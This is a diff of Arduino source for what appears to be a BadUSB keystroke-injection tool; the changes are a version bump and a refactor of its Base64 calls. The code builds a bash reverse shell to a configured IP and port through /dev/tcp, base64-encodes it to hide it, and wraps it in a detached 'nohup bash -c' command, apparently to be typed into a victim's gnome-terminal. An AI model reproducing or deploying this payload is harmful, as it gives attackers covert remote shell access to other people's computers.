@@ -21,12 +21,12 @@
 
   Author: NenshaM
   License: GPL v3
-  Version: 1.2.0
+  Version: 1.3.0
   ============================================================
 */
 
 #include <Keyboard.h>
-#include <Base64.h>
+#include "Base64.h"
 
 // ================= USER CONFIGURATION =================
 
@@ -56,19 +56,19 @@ const char TERMINAL_CMD[] = "gnome-terminal";
 char* create_payload(void) {
   char clearPayload[] = "bash -i >& /dev/tcp/" IP_ADDR "/" PORT_NUM " 0>&1 &";
 
-  int clearPayloadLength = strlen(clearPayload);
-  int encodedLength = Base64.encodedLength(clearPayloadLength);
-  int payloadLength = strlen("nohup bash -c \"$(echo '") + encodedLength + strlen("' | base64 --decode)\"; exit") + 1;
+  size_t clearPayloadLength = strlen(clearPayload);
+  size_t encodedLength = Base64::encodedLength(clearPayloadLength);
+  size_t payloadLength = strlen("nohup bash -c \"$(echo '") + encodedLength + strlen("' | base64 --decode)\";exit") + 1;
 
   // Dynamically allocate memory for the encoded string + "| base64 --decode"
   char* payload = new char[payloadLength];
   strcpy(payload, "nohup bash -c \"$(echo '");
 
   // Encode the input string
-  Base64.encode(payload + strlen("nohup bash -c \"$(echo '"), clearPayload, clearPayloadLength);
+  Base64::encode(payload + strlen("nohup bash -c \"$(echo '"), clearPayload, clearPayloadLength);
 
   // Append "| base64 --decode" to the encoded string
-  strcat(payload, "' | base64 --decode)\"; exit");
+  strcat(payload, "' | base64 --decode)\";exit");
 
   if (DEBUG_MODE) {
     Serial.print("Payload: ");
